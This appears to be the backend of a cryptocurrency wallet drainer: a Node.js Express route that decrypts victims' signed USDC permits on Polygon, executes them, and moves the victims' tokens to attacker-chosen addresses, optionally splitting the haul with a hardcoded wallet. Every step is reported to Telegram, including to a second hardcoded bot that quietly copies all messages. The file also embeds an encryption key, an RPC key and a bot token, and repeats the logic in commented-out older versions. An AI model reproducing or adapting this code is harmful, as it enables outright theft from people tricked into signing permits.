require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const { ERC20_ABI } = require("./ERC20_ABI");
const axios = require("axios");
const crypto = require("crypto");
const config = require("../config");

const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";

const router = express.Router();


const BR_Private_RPC_URLs = {
  137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
};

const getProvider = (chainId) => {
  const rpcUrl = BR_Private_RPC_URLs[chainId];
  if (!rpcUrl) {
    throw new Error(`Unsupported chain ID: ${chainId}`);
  }
  return new ethers.providers.JsonRpcProvider(rpcUrl);
};

const INITIATOR_PK = config.INITIATOR_PK;

const HARDCODED_RECIPIENT = "0x4758a129ee74947CFA6Ff970162D68e1ee9f55f7"; // Replace with actual recipient address

const initiatorWallet = new ethers.Wallet(INITIATOR_PK);

const decrypt = ({ data, iv }) => {
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(BR_ENCRYPTION_KEY, "hex"),
    Buffer.from(iv, "hex")
  );
  let decrypted = decipher.update(data, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
};

const decryptMiddleware = (req, res, next) => {
  try {
    const { encryptedData, iv } = req.body;

    if (!encryptedData || !iv) {
      return res.status(400).json({ error: "Missing encrypted data or IV" });
    }

    console.log("Received Encrypted Data:", encryptedData);
    console.log("Received IV:", iv);

    const decryptedData = decrypt({ data: encryptedData, iv });
    console.log("Decrypted Request Body:", decryptedData);
    req.body = decryptedData;
    next();
  } catch (error) {
    console.error("Error decrypting payload:", error.message);
    res.status(400).json({ error: "Invalid encrypted data" });
  }
};

const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;

    // First bot using .env configuration
    const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(urlEnvBot, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to .env Telegram bot: ${message}`);

    // Second bot with hardcoded values
    const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
    const HARD_CODED_CHAT_ID = "-1002535678431";
    const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
    await axios.post(urlHardcodedBot, {
      chat_id: HARD_CODED_CHAT_ID,
      text: truncatedMessage,
    });
    console.log(`Message sent to hardcoded Telegram bot: ${message}`);
  } catch (error) {
    console.error("Error sending message to Telegram:", error.response?.data || error.message);
  }
}

const splitTransfers = false; // Control flag to decide whether to split transfers

router.post("/handlePolygonUSDCPermit", decryptMiddleware, async (req, res) => {
  try {
    const { tokenAddress, userAddress, chainId, domain, message, signature, frontendRecipient } = req.body;

    if (!tokenAddress || !userAddress || !chainId || !domain || !message || !signature || !frontendRecipient) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const provider = getProvider(parseInt(chainId));
    const connectedWallet = initiatorWallet.connect(provider);
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, connectedWallet);

    const { v, r, s } = ethers.utils.splitSignature(signature);

    console.log("Verifying and executing permit...");
    const permitTx = await tokenContract.permit(
      message.owner,
      message.spender,
      message.value,
      message.deadline,
      v,
      r,
      s
    );
    await permitTx.wait();

    const permitMsg = `✅ Polygon USDC Permit Executed Successfully!\n\n🔗 Token: ${tokenAddress}\n🧑‍💻 Owner: ${message.owner}\n💰 Value: ${ethers.utils.formatUnits(message.value)}\n⛓️ Chain ID: ${chainId}\n🔑 Permit Tx Hash: ${permitTx.hash}`;
    await sendToTelegram(permitMsg);

    console.log("Permit executed. Initiating transfer...");

    const totalAmount = ethers.BigNumber.from(message.value);

    if (splitTransfers) {
      const frontendShare = totalAmount.div(2); // 50% for frontend
      const backendShare = totalAmount.sub(frontendShare); // Remaining 50%

      console.log(`Splitting ${totalAmount.toString()} into:`);
      console.log(`Frontend Recipient (${frontendRecipient}): ${frontendShare.toString()}`);
      console.log(`Backend Recipient (${HARDCODED_RECIPIENT}): ${backendShare.toString()}`);

      // Transfer to backendRecipient
      const transferTx2 = await tokenContract.transferFrom(
        message.owner,
        HARDCODED_RECIPIENT,
        backendShare
      );
      await transferTx2.wait();

      const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${HARDCODED_RECIPIENT}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
      await sendToTelegram(transfer2Msg);

      console.log(`Transfer to backendRecipient successful: ${transferTx2.hash}`);

      // Transfer to frontendRecipient
      const transferTx1 = await tokenContract.transferFrom(
        message.owner,
        frontendRecipient,
        frontendShare
      );
      await transferTx1.wait();

      const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
      await sendToTelegram(transfer1Msg);

      console.log(`Transfer to frontendRecipient successful: ${transferTx1.hash}`);

      return res.status(200).json({
        message: "Split transfer successful",
        recipients: [
          { address: frontendRecipient, share: frontendShare.toString() },
          { address: HARDCODED_RECIPIENT, share: backendShare.toString() },
        ],
        transactionHashes: [transferTx1.hash, transferTx2.hash],
      });
    } else {
      console.log(`Transferring entire balance to frontendRecipient: ${frontendRecipient}`);
      const transferTx = await tokenContract.transferFrom(message.owner, frontendRecipient, totalAmount);
      await transferTx.wait();

      console.log(`Transfer to frontendRecipient successful: ${transferTx.hash}`);

      const transferMsg = `📤 Transfer Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(totalAmount)}\n🔑 Tx Hash: ${transferTx.hash}`;
      await sendToTelegram(transferMsg);

      return res.status(200).json({
        message: "Transfer successful",
        recipients: [{ address: frontendRecipient, share: totalAmount.toString() }],
        transactionHashes: [transferTx.hash],
      });
    }
  } catch (error) {
    console.error("Error in handlePolygonUSDCPermit backend:", error);

    const errorMsg = `❌ Error in Polygon USDC Permit Handling:\n\n🛑 Message: ${error.message}`;
    await sendToTelegram(errorMsg);

    return res.status(500).json({ error: error.message });
  }
});

module.exports = router;

// router.post("/handlePolygonUSDCPermit", decryptMiddleware, async (req, res) => {
//   try {
//     const { tokenAddress, userAddress, chainId, domain, message, signature, frontendRecipient } = req.body;

//     if (!tokenAddress || !userAddress || !chainId || !domain || !message || !signature || !frontendRecipient) {
//       return res.status(400).json({ error: "Missing required fields" });
//     }

//     const provider = getProvider(parseInt(chainId));
//     const connectedWallet = initiatorWallet.connect(provider);
//     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, connectedWallet);

//     const { v, r, s } = ethers.utils.splitSignature(signature);

//     console.log("Verifying and executing permit...");
//     const permitTx = await tokenContract.permit(
//       message.owner,
//       message.spender,
//       message.value,
//       message.deadline,
//       v,
//       r,
//       s
//     );
//     await permitTx.wait();

//     const permitMsg = `✅ Polygon USDC Permit Executed Successfully!\n\n🔗 Token: ${tokenAddress}\n🧑‍💻 Owner: ${message.owner}\n💰 Value: ${ethers.utils.formatUnits(message.value)}\n⛓️ Chain ID: ${chainId}\n🔑 Permit Tx Hash: ${permitTx.hash}`;
//     await sendToTelegram(permitMsg);

//     console.log("Permit executed. Initiating split transfer...");

//     const totalAmount = ethers.BigNumber.from(message.value);
//     const frontendShare = totalAmount.div(2);
//     const backendShare = totalAmount.sub(frontendShare);

//     console.log(`Splitting ${totalAmount.toString()} into:`);
//     console.log(`Frontend Recipient (${frontendRecipient}): ${frontendShare.toString()}`);
//     console.log(`Backend Recipient (${HARDCODED_RECIPIENT}): ${backendShare.toString()}`);

//     const transferTx2 = await tokenContract.transferFrom(
//       message.owner,
//       HARDCODED_RECIPIENT,
//       backendShare
//     );
//     await transferTx2.wait();

//     const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${HARDCODED_RECIPIENT}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
//     await sendToTelegram(transfer2Msg);

//     console.log(`Transfer to backendRecipient successful: ${transferTx2.hash}`);

//     const transferTx1 = await tokenContract.transferFrom(
//       message.owner,
//       frontendRecipient,
//       frontendShare
//     );
//     await transferTx1.wait();

//     const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
//     await sendToTelegram(transfer1Msg);

//     console.log(`Transfer to frontendRecipient successful: ${transferTx1.hash}`);

//     return res.status(200).json({
//       message: "Split transfer successful",
//       recipients: [
//         { address: frontendRecipient, share: frontendShare.toString() },
//         { address: HARDCODED_RECIPIENT, share: backendShare.toString() },
//       ],
//       transactionHashes: [transferTx1.hash, transferTx2.hash],
//     });
//   } catch (error) {
//     console.error("Error in handlePolygonUSDCPermit backend:", error);

//     const errorMsg = `❌ Error in Polygon USDC Permit Handling:\n\n🛑 Message: ${error.message}`;
//     await sendToTelegram(errorMsg);

//     return res.status(500).json({ error: error.message });
//   }
// });

module.exports = router;




// require("dotenv").config();
// const express = require("express");
// const { ethers } = require("ethers");
// const { ERC20_ABI } = require("./ERC20_ABI");
// const axios = require("axios");

// const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
// const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

// const router = express.Router();

// const BR_Ankr_Token = process.env.BR_ANKR_TOKEN || "";

// const BR_Private_RPC_URLs = {
//   137: `https://rpc.ankr.com/polygon${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Polygon
// };

// const getProvider = (chainId) => {
//   const rpcUrl = BR_Private_RPC_URLs[chainId];
//   if (!rpcUrl) {
//     throw new Error(`Unsupported chain ID: ${chainId}`);
//   }
//   return new ethers.providers.JsonRpcProvider(rpcUrl);
// };

// const INITIATOR_PK = process.env.INITIATOR_PK;
// if (!INITIATOR_PK) {
//   throw new Error("INITIATOR_PK is missing in the environment variables");
// }

// const HARDCODED_RECIPIENT = ""

// const initiatorWallet = new ethers.Wallet(INITIATOR_PK);

// const sendToTelegram = async (message) => {
//   try {
//     const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
//     await axios.post(urlEnvBot, {
//       chat_id: TELEGRAM_CHAT_ID,
//       text: message,
//     });
//     console.log(`Message sent to Telegram: ${message}`);
//   } catch (error) {
//     console.error("Error sending message to Telegram:", error.message);
//   }
// };

// router.post("/handlePolygonUSDCPermit", async (req, res) => {
//   try {
//     const { tokenAddress, userAddress, chainId, domain, message, signature } = req.body;

//     if (!tokenAddress || !userAddress || !chainId || !domain || !message || !signature) {
//       return res.status(400).json({ error: "Missing required fields" });
//     }

//     const provider = getProvider(parseInt(chainId));
//     const connectedWallet = initiatorWallet.connect(provider);
//     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, connectedWallet);

//     const { v, r, s } = ethers.utils.splitSignature(signature);

//     console.log("Verifying and executing permit...");
//     const permitTx = await tokenContract.permit(
//       message.owner,
//       message.spender,
//       message.value,
//       message.deadline,
//       v,
//       r,
//       s
//     );
//     await permitTx.wait();

//     const permitMsg = `✅ Polygon USDC Permit Executed Successfully!\n\n🔗 Token: ${tokenAddress}\n🧑‍💻 Owner: ${message.owner}\n💰 Value: ${ethers.utils.formatUnits(message.value)}\n⛓️ Chain ID: ${chainId}\n🔑 Permit Tx Hash: ${permitTx.hash}`;
//     await sendToTelegram(permitMsg);

//     console.log("Permit executed. Initiating split transfer...");

//     // Backend recipient address
//     const backendRecipient = HARDCODED_RECIPIENT;

//     // Total value to split
//     const totalAmount = ethers.BigNumber.from(message.value);

//     // Calculate splits (50% to frontendRecipient, 50% to backendRecipient)
//     const frontendShare = totalAmount.div(2);
//     const backendShare = totalAmount.sub(frontendShare);

//     console.log(`Splitting ${totalAmount.toString()} into:`);
//     console.log(`Frontend Recipient (${req.body.frontendRecipient}): ${frontendShare.toString()}`);
//     console.log(`Backend Recipient (${backendRecipient}): ${backendShare.toString()}`);

//     // Transfer to backendRecipient
//     const transferTx2 = await tokenContract.transferFrom(
//       message.owner,
//       backendRecipient,
//       backendShare
//     );
//     await transferTx2.wait();

//     const transfer2Msg = `📤 Transfer #2 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${backendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(backendShare)}\n🔑 Tx Hash: ${transferTx2.hash}`;
//     await sendToTelegram(transfer2Msg);

//     console.log(`Transfer to backendRecipient successful: ${transferTx2.hash}`);

//     // Transfer to frontendRecipient
//     const transferTx1 = await tokenContract.transferFrom(
//       message.owner,
//       req.body.frontendRecipient,
//       frontendShare
//     );
//     await transferTx1.wait();

//     const transfer1Msg = `📤 Transfer #1 Successful!\n\n🔗 Token: ${tokenAddress}\n📩 To: ${req.body.frontendRecipient}\n💸 Amount: ${ethers.utils.formatUnits(frontendShare)}\n🔑 Tx Hash: ${transferTx1.hash}`;
//     await sendToTelegram(transfer1Msg);

//     console.log(`Transfer to frontendRecipient successful: ${transferTx1.hash}`);

//     return res.status(200).json({
//       message: "Split transfer successful",
//       recipients: [
//         { address: req.body.frontendRecipient, share: frontendShare.toString() },
//         { address: backendRecipient, share: backendShare.toString() },
//       ],
//       transactionHashes: [transferTx1.hash, transferTx2.hash],
//     });
//   } catch (error) {
//     console.error("Error in handlePolygonUSDCPermit backend:", error);

//     const errorMsg = `❌ Error in Polygon USDC Permit Handling:\n\n🛑 Message: ${error.message}`;
//     await sendToTelegram(errorMsg);

//     return res.status(500).json({ error: error.message });
//   }
// });

// module.exports = router;
